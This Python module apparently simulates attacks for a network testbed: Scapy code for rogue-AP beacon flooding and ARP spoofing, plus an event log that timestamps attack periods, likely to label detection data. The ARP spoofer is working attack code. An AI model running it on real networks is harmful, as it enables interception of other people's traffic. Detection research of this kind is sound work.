"""Rogue AP and ARP Spoofing attack simulators (threaded, Scapy-based)."""

from __future__ import annotations

import logging
import subprocess
import sys
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Callable, List, Optional

try:
    from scapy.all import ARP, Ether, sendp  # type: ignore
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap  # type: ignore
    _SCAPY_AVAILABLE = True
except ImportError:  # pragma: no cover
    _SCAPY_AVAILABLE = False

from config import CFG

log = logging.getLogger(__name__)


@dataclass
class AttackEvent:

    attack_type: str        # "rogue_ap" | "arp_spoof"
    action: str             # "start" | "stop"
    timestamp: float
    metadata: dict = field(default_factory=dict)


class BaseAttack(ABC):

    def __init__(
        self,
        iface: str,
        on_event: Optional[Callable[[AttackEvent], None]] = None,
        host: Optional[object] = None,
    ) -> None:
        self.iface = iface
        self._on_event = on_event
        self.host = host
        self._thread: Optional[threading.Thread] = None
        self._proc: Optional[subprocess.Popen] = None
        self._stop_evt = threading.Event()
        self.started_at: Optional[float] = None
        self.stopped_at: Optional[float] = None

    @property
    def attack_type(self) -> str:
        return self.__class__.__name__

    def start(self, rate_pps: int) -> None:
        if self.is_running():
            log.warning("%s already running.", self.attack_type)
            return
        self._rate_pps = max(1, int(rate_pps))
        self._stop_evt.clear()
        self.started_at = time.time()
        self._emit("start")
        if self.host is not None:
            self._start_in_host_namespace()
        else:
            self._thread = threading.Thread(
                target=self._loop, name=f"{self.attack_type}-loop", daemon=True
            )
            self._thread.start()
        log.info("%s started @ %d pps on %s", self.attack_type, self._rate_pps, self.iface)

    def stop(self) -> None:
        if not self.is_running():
            return
        self._stop_evt.set()
        if self._proc is not None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=3.0)
            except subprocess.TimeoutExpired:
                self._proc.kill()
            self._proc = None
        if self._thread is not None:
            self._thread.join(timeout=3.0)
        self.stopped_at = time.time()
        self._emit("stop")
        log.info("%s stopped.", self.attack_type)

    def is_running(self) -> bool:
        thread_running = self._thread is not None and self._thread.is_alive()
        proc_running = self._proc is not None and self._proc.poll() is None
        return thread_running or proc_running

    def _start_in_host_namespace(self) -> None:
        script = self._host_script()
        assert self.host is not None
        self._proc = self.host.popen(
            [sys.executable, "-c", script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def _emit(self, action: str, **meta) -> None:
        if self._on_event is None:
            return
        evt = AttackEvent(
            attack_type=self.attack_type,
            action=action,
            timestamp=time.time(),
            metadata=meta,
        )
        try:
            self._on_event(evt)
        except Exception:  # pragma: no cover
            log.exception("on_event callback failed.")

    @abstractmethod
    def _loop(self) -> None:
        raise NotImplementedError

    @abstractmethod
    def _host_script(self) -> str:
        raise NotImplementedError


class RogueAPAttack(BaseAttack):

    def __init__(
        self,
        iface: str,
        ssid: str = CFG.attack.rogue_ssid,
        bssid: str = "de:ad:be:ef:00:01",
        on_event: Optional[Callable[[AttackEvent], None]] = None,
        host: Optional[object] = None,
    ) -> None:
        super().__init__(iface=iface, on_event=on_event, host=host)
        self.ssid = ssid
        self.bssid = bssid

    def _build_beacon(self):
        if not _SCAPY_AVAILABLE:
            raise RuntimeError("Scapy not available.")
        pkt = (
            Ether(src=self.bssid, dst="ff:ff:ff:ff:ff:ff")
            / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                    addr2=self.bssid, addr3=self.bssid)
            / Dot11Beacon(cap="ESS")
            / Dot11Elt(ID="SSID", info=self.ssid.encode())
        )
        return pkt

    def _loop(self) -> None:
        interval = 1.0 / float(self._rate_pps)
        frame = self._build_beacon()
        while not self._stop_evt.is_set():
            try:
                sendp(frame, iface=self.iface, verbose=False)
            except Exception:  # pragma: no cover
                log.exception("RogueAPAttack send failed.")
                break
            self._stop_evt.wait(interval)

    def _host_script(self) -> str:
        return f"""
import time
from scapy.all import Ether, sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
iface = {self.iface!r}
rate_pps = {int(self._rate_pps)!r}
ssid = {self.ssid!r}
bssid = {self.bssid!r}
interval = 1.0 / float(max(1, rate_pps))
frame = (
    Ether(src=bssid, dst="ff:ff:ff:ff:ff:ff")
    / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    / Dot11Beacon(cap="ESS")
    / Dot11Elt(ID="SSID", info=ssid.encode())
)
while True:
    sendp(frame, iface=iface, verbose=False)
    time.sleep(interval)
"""


class ARPSpoofAttack(BaseAttack):

    def __init__(
        self,
        iface: str,
        attacker_mac: str,
        target_ip: str = CFG.attack.arp_spoof_target_ip,
        victim_ip: str = "10.0.0.2",
        on_event: Optional[Callable[[AttackEvent], None]] = None,
        host: Optional[object] = None,
    ) -> None:
        super().__init__(iface=iface, on_event=on_event, host=host)
        self.attacker_mac = attacker_mac
        self.target_ip = target_ip
        self.victim_ip = victim_ip

    def _build_arp_reply(self):
        if not _SCAPY_AVAILABLE:
            raise RuntimeError("Scapy not available.")
        pkt = Ether(src=self.attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            hwsrc=self.attacker_mac,
            psrc=self.target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=self.victim_ip,
        )
        return pkt

    def _loop(self) -> None:
        interval = 1.0 / float(self._rate_pps)
        pkt = self._build_arp_reply()
        while not self._stop_evt.is_set():
            try:
                sendp(pkt, iface=self.iface, verbose=False)
            except Exception:  # pragma: no cover
                log.exception("ARPSpoofAttack send failed.")
                break
            self._stop_evt.wait(interval)

    def _host_script(self) -> str:
        return f"""
import time
from scapy.all import ARP, Ether, sendp
iface = {self.iface!r}
rate_pps = {int(self._rate_pps)!r}
attacker_mac = {self.attacker_mac!r}
target_ip = {self.target_ip!r}
victim_ip = {self.victim_ip!r}
interval = 1.0 / float(max(1, rate_pps))
pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,
    hwsrc=attacker_mac,
    psrc=target_ip,
    hwdst="ff:ff:ff:ff:ff:ff",
    pdst=victim_ip,
)
while True:
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(interval)
"""


class AttackEventLog:

    def __init__(self) -> None:
        self._events: List[AttackEvent] = []
        self._lock = threading.Lock()

    def append(self, evt: AttackEvent) -> None:
        with self._lock:
            self._events.append(evt)

    def all(self) -> List[AttackEvent]:
        with self._lock:
            return list(self._events)

    def is_attack_at(self, ts: float, tolerance: float = 0.5) -> bool:
        return bool(self.active_types_at(ts=ts, tolerance=tolerance))

    def active_types_at(self, ts: float, tolerance: float = 0.5) -> List[str]:
        with self._lock:
            running: dict[str, float] = {}
            for e in self._events:
                if e.timestamp > ts + tolerance:
                    break
                if e.action == "start":
                    running[e.attack_type] = e.timestamp
                elif e.action == "stop":
                    running.pop(e.attack_type, None)
            return sorted(running.keys())

    def latest_attack_start_at(self, ts: float, tolerance: float = 0.5) -> Optional[float]:
        with self._lock:
            latest: Optional[float] = None
            for e in self._events:
                if e.timestamp > ts + tolerance:
                    break
                if e.action == "start":
                    latest = e.timestamp
            return latest
